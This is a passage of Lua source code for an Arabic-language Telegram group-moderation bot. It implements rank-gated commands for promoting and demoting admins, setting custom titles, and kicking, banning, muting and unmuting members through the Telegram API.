inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif AIANConstructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif BasicConstructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Constructor(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Manager(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Admin(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
end
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     Source WAAD     --
if text ==('تحكم') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
return false  
end
local Text = ' ⌯︙قم باستعمال الازرار للتحكم العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
inline = {
{{text="رفع رتبه",callback_data=msg.sender_user_id_..":SetRtba:"..result.sender_user_id_},{text="تنزيل رتبه",callback_data=msg.sender_user_id_..":RemRtba:"..result.sender_user_id_}},
{{text="كتم",callback_data=msg.sender_user_id_..":Mute:"..result.sender_user_id_},{text="الغاء كتم",callback_data=msg.sender_user_id_..":UnMute:"..result.sender_user_id_}},
{{text="حظر",callback_data=msg.sender_user_id_..":Ban:"..result.sender_user_id_},{text="الغاء حظر",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},
{{text="تقيد",callback_data=msg.sender_user_id_..":Tked:"..result.sender_user_id_},{text="الغاء تقيد",callback_data=msg.sender_user_id_..":UnTked:"..result.sender_user_id_}},
{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}
}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     Source WAAD     --
if BasicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..WAAD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه مشرف في المجموعه")  
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..WAAD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من مشرفين المجموعه")  
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..WAAD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local AIAN = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..WAAD)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم اضافة ↫ "..AIAN.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..AIAN)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⌯︙ليس لديه لقب هنا') 
else
send(msg.chat_id_, msg.id_,'⌯︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⌯︙ليس لديك لقب هنا') 
else
send(msg.chat_id_, msg.id_,'⌯︙لقبك ↫ '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == "تفعيل نبذتي" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر نبذتي بنجاح")
DevAIAN:del(WAAD..'AIAN:Bio:AIAN'..msg.chat_id_) 
end
if text == "تعطيل نبذتي" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر نبذتي بنجاح")
DevAIAN:set(WAAD..'AIAN:Bio:AIAN'..msg.chat_id_,true)  
end
if text == 'نبذتي' or text == 'بايو' then
if not DevAIAN:get(WAAD..'AIAN:Bio:AIAN'..msg.chat_id_) then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "راسلني" then
WAAD = {"ها هلاو","انطق","كول حبي","تفضل"};
send(msg.sender_user_id_, 0,WAAD[math.random(#WAAD)])
end
end
--     Source WAAD     --
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
--     Source WAAD     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end end end
--     Source WAAD     --
if Constructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) or text == "تفعيل الطرد" and ChCheck(msg) then
DevAIAN:del(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر الطرد و الحظر")
end
if text == "تعطيل الحظر" and ChCheck(msg) or text == "تعطيل الطرد" and ChCheck(msg) then
DevAIAN:set(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_,"true")
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر الطرد و الحظر")
end
if text == "تفعيل الكتم" and ChCheck(msg) or text == "تفعيل التقييد" and ChCheck(msg) then
DevAIAN:del(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر الكتم و التقيد")
end
if text == "تعطيل الكتم" and ChCheck(msg) or text == "تعطيل التقييد" and ChCheck(msg) then
DevAIAN:set(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_,"true")
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر الكتم و التقيد")
end
end
if BasicConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) or text == "تفعيل الترقيه" and ChCheck(msg) then
DevAIAN:del(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
DevAIAN:set(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_,"true")
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     Source WAAD     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source WAAD     --
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAIAN:sadd(WAAD..'AIAN:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevAIAN:sadd(WAAD..'AIAN:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌯︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevAIAN:sadd(WAAD..'AIAN:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source WAAD     --
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","⌯︙تم الغاء حظره من المجموعه")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevAIAN:srem(WAAD..'AIAN:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","⌯︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source WAAD     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو بالفعل مكتوم من المجموعه")  
else
DevAIAN:sadd(WAAD..'AIAN:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⌯︙هو بالفعل مكتوم من المجموعه")  
else
DevAIAN:sadd(WAAD..'AIAN:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم كتمه من المجموعه")  
end
end
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⌯︙هو بالفعل مكتوم من المجموعه")  
else
DevAIAN:sadd(WAAD..'AIAN:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم كتمه من المجموعه")  
end
end
end
--     Source WAAD     --
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس مكتوم لالغاء كتمه")  
else
DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⌯︙هو ليس مكتوم لالغاء كتمه")  
else
DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⌯︙هو ليس مكتوم لالغاء كتمه")  
else
DevAIAN:srem(WAAD..'AIAN:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم الغاء كتمه من المجموعه")  
end
end 
end 
